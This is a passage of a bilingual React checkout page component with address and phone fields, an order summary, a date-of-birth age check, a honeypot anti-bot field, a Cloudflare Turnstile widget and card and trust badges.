                    {isFr ? 'Ville' : 'City'}
                  </label>
                  <input
                    type="text"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Code postal' : 'Postal code'}
                  </label>
                  <input
                    type="text"
                    name="postalCode"
                    value={formData.postalCode}
                    onChange={handleInputChange}
                    className={`w-full px-3 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm ${formData.postalCode && !isValidPostalCode(formData.postalCode, formData.country) ? 'border-red-300 focus:ring-red-500' : 'border-gray-300'}`}
                    placeholder={formData.country === 'US' ? '10001' : 'H1H 3K3'}
                    maxLength={formData.country === 'US' ? 5 : 7}
                    required
                  />
                  {formData.postalCode && !isValidPostalCode(formData.postalCode, formData.country) && (
                    <p className="text-red-500 text-xs mt-1">
                      {formData.country === 'US' 
                        ? (isFr ? 'Format: 5 chiffres (ex: 10001)' : 'Format: 5 digits (e.g. 10001)')
                        : (isFr ? 'Format: A1A 1A1' : 'Format: A1A 1A1')}
                    </p>
                  )}
                </div>
              </div>
              
              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  {isFr ? 'Pays' : 'Country'}
                </label>
                <select
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                >
                  <option value="CA">Canada</option>
                  <option value="US">{isFr ? 'États-Unis' : 'United States'}</option>
                </select>
              </div>

              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  {formData.country === 'US' ? (isFr ? 'État' : 'State') : 'Province'}
                </label>
                {formData.country === 'US' ? (
                  <input
                    type="text"
                    name="province"
                    value={formData.province}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                    placeholder={isFr ? 'Ex: California, New York...' : 'e.g. California, New York...'}
                    required
                  />
                ) : (
                  <select
                    name="province"
                    value={formData.province}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                    required
                  >
                    <option value="">{isFr ? 'Sélectionnez une province' : 'Select a province'}</option>
                    <option value="AB">Alberta</option>
                    <option value="BC">{isFr ? 'Colombie-Britannique' : 'British Columbia'}</option>
                    <option value="MB">Manitoba</option>
                    <option value="NB">{isFr ? 'Nouveau-Brunswick' : 'New Brunswick'}</option>
                    <option value="NL">{isFr ? 'Terre-Neuve-et-Labrador' : 'Newfoundland and Labrador'}</option>
                    <option value="NT">{isFr ? 'Territoires du Nord-Ouest' : 'Northwest Territories'}</option>
                    <option value="NS">{isFr ? 'Nouvelle-Écosse' : 'Nova Scotia'}</option>
                    <option value="NU">Nunavut</option>
                    <option value="ON">Ontario</option>
                    <option value="PE">{isFr ? 'Île-du-Prince-Édouard' : 'Prince Edward Island'}</option>
                    <option value="QC">{isFr ? 'Québec' : 'Quebec'}</option>
                    <option value="SK">Saskatchewan</option>
                    <option value="YT">Yukon</option>
                  </select>
                )}
              </div>

              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  {isFr ? 'Numéro de téléphone' : 'Phone number'}
                </label>
                <input
                  type="tel"
                  name="phone"
                  value={formData.phone}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                  placeholder="(438)-438-4394"
                  maxLength={17}
                  required
                />
              </div>
            </div>

          </div>

          <div className="lg:col-span-1">
            <div className="bg-white rounded-2xl p-6 border border-neutral-100 sticky top-4">
              <h2 className="text-base font-semibold text-neutral-900 mb-4">
                {isFr ? 'Résumé de commande' : 'Order Summary'}
              </h2>
              
              <div className="space-y-3 mb-4 max-h-60 overflow-y-auto">
                {items.map((item) => (
                  <div key={item.id} className="flex gap-3">
                    <div className="relative w-12 h-12 rounded-xl overflow-hidden bg-neutral-50 flex-shrink-0">
                      <Image
                        src={item.image || "/placeholder.svg"}
                        alt={item.name}
                        fill
                        sizes="64px"
                        className="object-cover"
                      />
                    </div>
                    <div className="flex-1">
                      <h4 className="text-sm font-medium text-neutral-900 truncate">
                        {item.name}
                      </h4>
                      <div className="flex justify-between items-center">
                        <span className="text-xs text-neutral-400">
                          {isFr ? 'Qté' : 'Qty'}: {item.quantity}
                        </span>
                        <span className="text-sm font-medium">
                          {formatPrice(item.price * item.quantity)}
                        </span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
              
              <div className="space-y-2 mb-4 text-sm">
                <div className="flex justify-between">
                  <span className="text-neutral-400">{isFr ? 'Sous-total' : 'Subtotal'}</span>
                  <span className="font-medium">{formatPrice(total)}</span>
                </div>
                {discountApplied && (
                  <div className="flex justify-between">
                    <span className="text-green-600 font-medium">{isFr ? 'Rabais compte' : 'Account Discount'}</span>
                    <span className="font-bold text-green-600">-{formatPrice(discountAmount)}</span>
                  </div>
                )}
                <div className="flex justify-between">
                  <span className="text-neutral-400">{isFr ? 'Livraison' : 'Shipping'}</span>
                  <span className="font-medium">
                    {shipping === 0 ? (
                      <span className="text-green-600">{isFr ? 'Gratuite' : 'Free'}</span>
                    ) : (
                      formatPrice(shipping)
                    )}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-neutral-400">{isFr ? 'Taxes' : 'Taxes'}</span>
                  <span className="font-medium">{formatPrice(taxes)}</span>
                </div>
              </div>
              
              <div className="border-t border-neutral-100 pt-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium text-neutral-500">Total</span>
                  <span className="text-xl font-semibold text-neutral-900">
                    {formatPrice(finalTotal)}
                  </span>
                </div>
              </div>

              {/* Date of Birth Verification */}
              <div className="mb-6 p-4 bg-neutral-50 rounded-xl">
                <h3 className="text-xs font-medium text-neutral-900 mb-3 flex items-center gap-2">
                  <Lock className="w-3.5 h-3.5 text-neutral-400" />
                  {isFr ? 'Vérification de l\'âge (13+)' : 'Age Verification (13+)'}
                </h3>
                <div className="relative">
                  <label className="block text-xs font-medium text-neutral-500 mb-2">
                    {isFr ? 'Date de naissance' : 'Date of birth'}
                  </label>
                  
                  {/* Custom Date Picker Button */}
                  <button
                    type="button"
                    onClick={() => setShowDatePicker(!showDatePicker)}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm bg-white text-left flex items-center justify-between"
                  >
                    <span className={formData.dateOfBirth ? 'text-neutral-900' : 'text-neutral-400'}>
                      {formData.dateOfBirth ? 
                        new Date(formData.dateOfBirth).toLocaleDateString(isFr ? 'fr-FR' : 'en-CA') : 
                        (isFr ? 'Sélectionner une date' : 'Select a date')
                      }
                    </span>
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                    </svg>
                  </button>

                  {/* Custom Dropdown */}
                  {showDatePicker && (
                    <div className="absolute top-full left-0 right-0 mt-1 bg-white border border-neutral-200 rounded-xl shadow-lg z-50 p-4">
                      <div className="grid grid-cols-3 gap-3">
                        {/* Day */}
                        <div>
                          <label className="block text-xs font-medium text-neutral-500 mb-1">{isFr ? 'Jour' : 'Day'}</label>
                          <select
                            value={selectedDay}
                            onChange={(e) => {
                              setSelectedDay(e.target.value)
                              updateDateOfBirth(e.target.value, selectedMonth, selectedYear)
                            }}
                            className="w-full px-2 py-1.5 border border-neutral-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-neutral-900"
                          >
                            <option value="">{isFr ? 'Jour' : 'Day'}</option>
                            {Array.from({length: 31}, (_, i) => i + 1).map(day => (
                              <option key={day} value={day}>{day}</option>
                            ))}
                          </select>
                        </div>

                        {/* Month */}
                        <div>
                          <label className="block text-xs font-medium text-neutral-500 mb-1">{isFr ? 'Mois' : 'Month'}</label>
                          <select
                            value={selectedMonth}
                            onChange={(e) => {
                              setSelectedMonth(e.target.value)
                              updateDateOfBirth(selectedDay, e.target.value, selectedYear)
                            }}
                            className="w-full px-2 py-1.5 border border-neutral-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-neutral-900"
                          >
                            <option value="">{isFr ? 'Mois' : 'Month'}</option>
                            {(isFr ? [
                              {value: '1', label: 'Jan'}, {value: '2', label: 'Fév'}, {value: '3', label: 'Mar'},
                              {value: '4', label: 'Avr'}, {value: '5', label: 'Mai'}, {value: '6', label: 'Jun'},
                              {value: '7', label: 'Jul'}, {value: '8', label: 'Aoû'}, {value: '9', label: 'Sep'},
                              {value: '10', label: 'Oct'}, {value: '11', label: 'Nov'}, {value: '12', label: 'Déc'}
                            ] : [
                              {value: '1', label: 'Jan'}, {value: '2', label: 'Feb'}, {value: '3', label: 'Mar'},
                              {value: '4', label: 'Apr'}, {value: '5', label: 'May'}, {value: '6', label: 'Jun'},
                              {value: '7', label: 'Jul'}, {value: '8', label: 'Aug'}, {value: '9', label: 'Sep'},
                              {value: '10', label: 'Oct'}, {value: '11', label: 'Nov'}, {value: '12', label: 'Dec'}
                            ]).map(month => (
                              <option key={month.value} value={month.value}>{month.label}</option>
                            ))}
                          </select>
                        </div>

                        {/* Year */}
                        <div>
                          <label className="block text-xs font-medium text-neutral-500 mb-1">{isFr ? 'Année' : 'Year'}</label>
                          <select
                            value={selectedYear}
                            onChange={(e) => {
                              setSelectedYear(e.target.value)
                              updateDateOfBirth(selectedDay, selectedMonth, e.target.value)
                            }}
                            className="w-full px-2 py-1.5 border border-neutral-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-neutral-900"
                          >
                            <option value="">{isFr ? 'Année' : 'Year'}</option>
                            {Array.from({length: 88}, (_, i) => new Date().getFullYear() - 13 - i).map(year => (
                              <option key={year} value={year}>{year}</option>
                            ))}
                          </select>
                        </div>
                      </div>
                      
                      <button
                        type="button"
                        onClick={() => setShowDatePicker(false)}
                        className="mt-3 w-full bg-brand text-white py-2 px-3 rounded-lg text-sm hover:bg-brand-dark transition-colors"
                      >
                        {isFr ? 'Confirmer' : 'Confirm'}
                      </button>
                    </div>
                  )}
                  
                  <p className="text-xs text-neutral-400 mt-1">
                    {isFr ? 'Requis pour vérifier votre âge' : 'Required to verify your age'}
                  </p>
                </div>
              </div>
              
              <form onSubmit={handleSubmit}>
                {/* Honeypot - hidden from real users */}
                <div style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, overflow: 'hidden' }} aria-hidden="true">
                  <label htmlFor="website">Website</label>
                  <input type="text" id="website" name="website" value={honeypot} onChange={(e) => setHoneypot(e.target.value)} tabIndex={-1} autoComplete="off" />
                </div>

                {/* Cloudflare Turnstile - invisible */}
                <div
                  className="cf-turnstile"
                  data-sitekey="0x4AAAAAACZT46yj0cMxXUbs"
                  data-callback="onTurnstileCallback"
                  data-expired-callback="onTurnstileExpired"
                  data-size="invisible"
                />

                <button 
                  type="submit"
                  disabled={isProcessing || !isFormValid()}
                  className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white py-5 px-6 rounded-xl font-semibold text-lg transition-all duration-300 flex items-center justify-center gap-3 shadow-lg hover:shadow-xl transform hover:scale-[1.02] active:scale-[0.98]"
                >
                  {isProcessing ? (
                    <>
                      <div className="w-5 h-5 border-3 border-white border-t-transparent rounded-full animate-spin" />
                      <span className="text-white font-medium">
                        {isFr ? 'Traitement en cours...' : 'Processing...'}
                      </span>
                    </>
                  ) : (
                    <>
                      <Lock className="w-5 h-5 flex-shrink-0" />
                      <span className="text-white font-semibold">
                        {isFr ? 'Finaliser ma commande' : 'Complete order'}
                      </span>
                    </>
                  )}
                </button>
              </form>

              {/* Payment Cards Accepted */}
              <div className="mt-4 pt-4 border-t border-gray-200">
                <p className="text-xs text-gray-500 text-center mb-3">{isFr ? 'Cartes acceptées' : 'Cards accepted'}</p>
                <div className="flex items-center justify-center gap-3">
                  <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg" alt="Visa" className="h-5 w-8 opacity-70" />
                  <img src="https://secure.payment-ca.com/assets/img/mastercard.svg" alt="Mastercard" className="h-5 w-8 opacity-70" />
                  <img src="https://secure.payment-ca.com/assets/img/amex.svg" alt="Amex" className="h-5 w-8 opacity-70" />
                  <img src="https://secure.payment-ca.com/assets/img/discover.svg" alt="Discover" className="h-5 w-8 opacity-70" />
                </div>
              </div>
              
              {/* Trust Badges Section */}
              <div className="mt-6 pt-6 border-t border-gray-200">
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                  <div className="text-center">
                    <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-2">
                      <MapPin className="w-4 h-4 text-blue-600" />
                    </div>
                    <p className="text-xs text-gray-600 font-medium">
                      {isFr ? 'Fabriqué pour le Canada' : 'Made for Canada'}
                    </p>
                  </div>
                  <div className="text-center">
                    <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                      <Truck className="w-4 h-4 text-green-600" />
                    </div>
                    <p className="text-xs text-gray-600 font-medium">
                      {isFr ? 'Livraison Gratuite' : 'Free Shipping'}
                    </p>
                  </div>
                  <div className="text-center">
                    <div className="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-2">
                      <Shield className="w-4 h-4 text-purple-600" />
                    </div>
                    <p className="text-xs text-gray-600 font-medium">
                      {isFr ? 'Garantie 1 Mois' : '1-Month Guarantee'}
                    </p>
                  </div>
                  <div className="text-center">
                    <div className="w-8 h-8 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-2">
                      <Clock className="w-4 h-4 text-orange-600" />
                    </div>
                    <p className="text-xs text-gray-600 font-medium">
                      {isFr ? 'Livraison Rapide' : 'Fast Delivery'}
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
